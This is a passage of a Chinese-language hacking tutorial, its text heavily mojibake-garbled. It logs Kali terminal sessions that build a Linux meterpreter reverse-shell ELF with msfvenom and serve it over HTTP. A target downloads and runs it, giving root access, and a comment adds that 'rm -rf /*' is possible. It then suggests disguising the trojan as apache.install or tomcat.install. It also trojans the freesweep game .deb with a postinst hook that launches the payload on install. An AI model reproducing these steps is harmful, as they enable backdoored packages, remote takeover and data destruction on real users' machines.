linuxå¾ˆå¤šç”µè„‘æ²¡æœ‰æ€æ¯’è½¯ä»¶ å¾ˆå±é™©

msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -f elf -o /var/www/html/testliunx
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -f elf -o /var/www/html/testliunx
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 175 (iteration=0)
x64/xor chosen with final size 175
Payload size: 175 bytes
Final size of elf file: 295 bytes
Saved as: /var/www/html/testliunx


ç”Ÿæˆä¸€ä¸ªæœ¨é©¬
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -f elf -o /var/www/html/testliunx
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 175 (iteration=0)
x64/xor chosen with final size 175
Payload size: 175 bytes
Final size of elf file: 295 bytes
Saved as: /var/www/html/testliunx

æ›´æ¢payloadå¼€å§‹ç›‘å¬
msf6 > use exploit/multi/handler
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.101.53   yes       The listen address (an interface may be specified
                                     )
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.101.53:4444 


ä¹‹åå»ç›®æ ‡æœºå™¨ä¸Šä¸‹è½½æœ¨é©¬ ç›´æ¥wget
Last login: Sat Feb 15 22:55:57 2025 from 192.168.101.96
[root@localhost ~]# wget http://192.168.101.53/testlinux
--2025-02-17 00:15:40--  http://192.168.101.53/testlinux
æ­£åœ¨è¿æ¥ 192.168.101.53:80... å·²è¿æ¥ã€‚
å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 404 Not Found
2025-02-17 00:15:40 é”™è¯¯ 404ï¼šNot Foundã€‚

[root@localhost ~]# wget http://192.168.101.53/testliunx
--2025-02-17 00:17:51--  http://192.168.101.53/testliunx
æ­£åœ¨è¿æ¥ 192.168.101.53:80... å·²è¿æ¥ã€‚
å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK
é•¿åº¦ï¼š295
æ­£åœ¨ä¿å­˜è‡³: â€œtestliunxâ€

100%[=================================================================================>] 295         --.-K/s ç”¨æ—¶ 0s      

2025-02-17 00:17:51 (98.2 MB/s) - å·²ä¿å­˜ â€œtestliunxâ€ [295/295])

ä¹‹åæˆ‘ä»¬è¿è¡Œä¸€ä¸‹
[root@localhost ~]# ^C
[root@localhost ~]# ./testliunx
-bash: ./testliunx: æƒé™ä¸å¤Ÿ
[root@localhost ~]# chmod 777 ./testliunx
[root@localhost ~]# ./testliunx

å›kaliçœ‹æŒ‚é©¬æƒ…å†µ å‘ç°å·²ç»æˆåŠŸ
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.101.53:4444 
ls
[*] Sending stage (3045380 bytes) to 192.168.101.99
[*] Meterpreter session 14 opened (192.168.101.53:4444 -> 192.168.101.99:49414) at 2025-02-17 16:22:47 +0800

meterpreter > ls
Listing: /root
==============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  24922  fil   2025-02-16 15:10:53 +0800  .bash_history
100644/rw-r--r--  18     fil   2013-12-29 10:26:31 +0800  .bash_logout
100644/rw-r--r--  176    fil   2013-12-29 10:26:31 +0800  .bash_profile
100644/rw-r--r--  176    fil   2013-12-29 10:26:31 +0800  .bashrc
040700/rwx------  31     dir   2025-02-16 09:49:07 +0800  .cache
040700/rwx------  30     dir   2025-02-16 09:49:07 +0800  .config
100644/rw-r--r--  100    fil   2013-12-29 10:26:31 +0800  .cshrc
040700/rwx------  25     dir   2025-02-16 09:45:42 +0800  .dbus
040740/rwxr-----  19     dir   2025-02-16 09:49:21 +0800  .pki
100644/rw-r--r--  129    fil   2013-12-29 10:26:31 +0800  .tcshrc
100600/rw-------  681    fil   2025-02-16 10:18:04 +0800  .viminfo
100600/rw-------  2827   fil   2025-02-16 09:45:14 +0800  anaconda-ks.cfg
100644/rw-r--r--  2835   fil   2025-02-16 09:45:55 +0800  initial-setup-ks.cfg
100600/rw-------  2107   fil   2025-02-16 09:45:14 +0800  original-ks.cfg
100777/rwxrwxrwx  295    fil   2025-02-17 16:21:55 +0800  testliunx

meterpreter > ls
Listing: /root
==============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  24922  fil   2025-02-16 15:10:53 +0800  .bash_history
100644/rw-r--r--  18     fil   2013-12-29 10:26:31 +0800  .bash_logout
100644/rw-r--r--  176    fil   2013-12-29 10:26:31 +0800  .bash_profile
100644/rw-r--r--  176    fil   2013-12-29 10:26:31 +0800  .bashrc
040700/rwx------  31     dir   2025-02-16 09:49:07 +0800  .cache
040700/rwx------  30     dir   2025-02-16 09:49:07 +0800  .config
100644/rw-r--r--  100    fil   2013-12-29 10:26:31 +0800  .cshrc
040700/rwx------  25     dir   2025-02-16 09:45:42 +0800  .dbus
040740/rwxr-----  19     dir   2025-02-16 09:49:21 +0800  .pki
100644/rw-r--r--  129    fil   2013-12-29 10:26:31 +0800  .tcshrc
100600/rw-------  681    fil   2025-02-16 10:18:04 +0800  .viminfo
100600/rw-------  2827   fil   2025-02-16 09:45:14 +0800  anaconda-ks.cfg
100644/rw-r--r--  2835   fil   2025-02-16 09:45:55 +0800  initial-setup-ks.cfg
100600/rw-------  2107   fil   2025-02-16 09:45:14 +0800  original-ks.cfg
100777/rwxrwxrwx  295    fil   2025-02-17 16:21:55 +0800  testliunx

meterpreter > 

ç”¨æˆ·ç”¨ä»€ä¹ˆæƒé™æŒ‡å®šçš„æœ¨é©¬ æˆ‘ä»¬å°±èƒ½æ‹¿åˆ°ä»€ä¹ˆæƒé™
meterpreter > shell
Process 74730 created.
Channel 1 created.
ls
anaconda-ks.cfg
initial-setup-ks.cfg
original-ks.cfg
testliunx
id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
#######################rm -rf /* ä¹Ÿå¯ä»¥

æˆ‘ä»¬å¯ä»¥å°†æœ¨é©¬ä¼ªè£…æˆåŸºç¡€çš„åº“æ–‡ä»¶ 
æ¯”å¦‚ä¼ªè£…æˆå„ç§install
apache.install
tomcat.install

é™¤äº†ç›´æ¥è¿™æ ·è¿è¡Œ è¿˜å¯ä»¥åˆ¶ä½œæ¶æ„debè½¯ä»¶åŒ…æ¥æ¤å…¥åé—¨
æˆ‘ä»¬æƒ³è¦å¯¹debæ–‡ä»¶è§£åŒ…
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# dpkg --info freesweep_1.0.1-2_amd64.deb 
 æ–°æ ¼å¼çš„ Debian è½¯ä»¶åŒ…ï¼Œæ ¼å¼ç‰ˆæœ¬ 2.0ã€‚
 å¤§å° 55636 å­—èŠ‚ï¼šä¸»æ§åŒ…=1136 å­—èŠ‚ã€‚
      13 bytes,     1 lines      conffiles
     666 bytes,    15 lines      control
     496 bytes,     7 lines      md5sums
     186 å­—èŠ‚ï¼Œ   16 è¡Œ   *  postinst             #!/bin/sh
     121 å­—èŠ‚ï¼Œ   13 è¡Œ   *  postrm               #!/bin/sh
 Package: freesweep
 Version: 1.0.1-2
 Architecture: amd64
 Maintainer: Debian Games Team <pkg-games-devel@lists.alioth.debian.org>
 Installed-Size: 139
 Depends: libc6 (>= 2.7), libncurses6 (>= 6), libtinfo6 (>= 6)
 Section: games
 Priority: optional
 Homepage: https://github.com/rwestlund/freesweep
 Description: text-based minesweeper
  Freesweep is an implementation of the popular minesweeper game, where
  one tries to find all the mines without igniting any, based on hints given
  by the computer.  Unlike most implementations of this game, Freesweep
  works in any visual text display - in Linux console, in an xterm, and in
  most text-based terminals currently in use.
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# dpkg --info freesweep_1.0.1-2_amd64.deb 
 æ–°æ ¼å¼çš„ Debian è½¯ä»¶åŒ…ï¼Œæ ¼å¼ç‰ˆæœ¬ 2.0ã€‚
 å¤§å° 55636 å­—èŠ‚ï¼šä¸»æ§åŒ…=1136 å­—èŠ‚ã€‚
      13 bytes,     1 lines      conffiles
     666 bytes,    15 lines      control
     496 bytes,     7 lines      md5sums
     186 å­—èŠ‚ï¼Œ   16 è¡Œ   *  postinst             #!/bin/sh
     121 å­—èŠ‚ï¼Œ   13 è¡Œ   *  postrm               #!/bin/sh
 Package: freesweep
 Version: 1.0.1-2
 Architecture: amd64
 Maintainer: Debian Games Team <pkg-games-devel@lists.alioth.debian.org>
 Installed-Size: 139
 Depends: libc6 (>= 2.7), libncurses6 (>= 6), libtinfo6 (>= 6)
 Section: games
 Priority: optional
 Homepage: https://github.com/rwestlund/freesweep
 Description: text-based minesweeper
  Freesweep is an implementation of the popular minesweeper game, where
  one tries to find all the mines without igniting any, based on hints given
  by the computer.  Unlike most implementations of this game, Freesweep
  works in any visual text display - in Linux console, in an xterm, and in
  most text-based terminals currently in use.

â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# dbkg -x freesweep_1.0.1-2_amd64.deb free
æ‰¾ä¸åˆ°å‘½ä»¤ â€œdbkgâ€ï¼Œæ‚¨çš„æ„æ€æ˜¯ï¼š
  â€œdpkgâ€ å‘½ä»¤æ¥è‡ª Debian è½¯ä»¶åŒ… dpkg
å°è¯• apt install <deb name>
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# ls free
ls: æ— æ³•è®¿é—® 'free': æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# dpkg -x freesweep_1.0.1-2_amd64.deb free
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# ls free
etc  usr  var

â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# cd free
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/free]
â””â”€# cd ../ 
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# dpkg -e freesweep_1.0.1-2_amd64.deb free/DEBIAN
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# ls free
DEBIAN  etc  usr  var
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# cd ./free/DEBIAN 
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/free/DEBIAN]
â””â”€# ls     
conffiles  control  md5sums  postinst  postrm

å‡†å¤‡ç”Ÿæˆè¯­å¥
msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -f elf -o /root/free/usr/games/freesweep_sources

â”Œâ”€â”€(rootğŸ’€tyza66)-[~/free]
â””â”€# cd ./usr        
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/free/usr]
â””â”€# ls      
games  share
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/free/usr]
â””â”€# cd ../games
cd: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•: ../games
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/free/usr]
â””â”€# cd ./games 
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/free/usr/games]
â””â”€# ls
freesweep
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/free/usr/games]
â””â”€# cd        
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -f elf -o /root/free/usr/games/freesweep_sources
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 175 (iteration=0)
x64/xor chosen with final size 175
Payload size: 175 bytes
Final size of elf file: 295 bytes
Saved as: /root/free/usr/games/freesweep_sources
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# cd /free/usr/games
cd: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•: /free/usr/games
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# cd ./free/usr/games
                                                                             
â”€â”€(rootğŸ’€tyza66)-[~/free/usr/games]
â””â”€# ls
freesweep  freesweep_sources
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/free/usr/games]
â””â”€# cd                 
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# vim /root/free/DEBIAN/postinst 
                                                                             
ä¹‹åæˆ‘ä»¬è¦é‡æ–°æ„å»ºè½¯ä»¶åŒ…
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# dpkg-deb --build /root/free                    
dpkg-deb: æ­£åœ¨ '/root/free.deb' ä¸­æ„å»ºè½¯ä»¶åŒ… 'freesweep'ã€‚
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# ls
æœåŠ¡å™¨è´¦å¯†.txt  aircrack_8812au              home
å…¬å…±            bak.xml                      msf.exe
æ¨¡æ¿            binding                      output
è§†é¢‘            Desktop                      ppzbPalG.html
å›¾ç‰‡            free                         SecureCRT-kg.exe
æ–‡æ¡£            free.deb                     SecureCRT-kg.ico
ä¸‹è½½            freesweep_1.0.1-2_amd64.deb  ZkKBlJwr.jpeg
éŸ³ä¹            go
æ¡Œé¢            hello.txt

å°±ä¼šäº§ç”Ÿfree.deb

ä¹‹åå’±ä»¬å°è¯•å®‰è£…è½¯ä»¶åŒ…çœ‹çœ‹
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# dpkg -i free.deb                               
æ­£åœ¨é€‰ä¸­æœªé€‰æ‹©çš„è½¯ä»¶åŒ… freesweepã€‚
(æ­£åœ¨è¯»å–æ•°æ®åº“ ... ç³»ç»Ÿå½“å‰å…±å®‰è£…æœ‰ 432268 ä¸ªæ–‡ä»¶å’Œç›®å½•ã€‚)
å‡†å¤‡è§£å‹ free.deb  ...
æ­£åœ¨è§£å‹ freesweep (1.0.1-2) ...
æ­£åœ¨è®¾ç½® freesweep (1.0.1-2) ...
nohup: æŠŠè¾“å‡ºè¿½åŠ åˆ° 'nohup.out'
æ­£åœ¨å¤„ç†ç”¨äº desktop-file-utils (0.27-2) çš„è§¦å‘å™¨ ...
æ­£åœ¨å¤„ç†ç”¨äº hicolor-icon-theme (0.17-2) çš„è§¦å‘å™¨ ...
æ­£åœ¨å¤„ç†ç”¨äº man-db (2.12.1-1) çš„è§¦å‘å™¨ ...


ä¹‹åçœ‹ç›‘å¬é‚£è¾¹
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.101.53:4444 
[*] Sending stage (3045380 bytes) to 192.168.101.53
[*] Meterpreter session 15 opened (192.168.101.53:4444 -> 192.168.101.53:42702) at 2025-02-17 16:53:55 +0800

meterpreter > 

æˆåŠŸ



                                                                            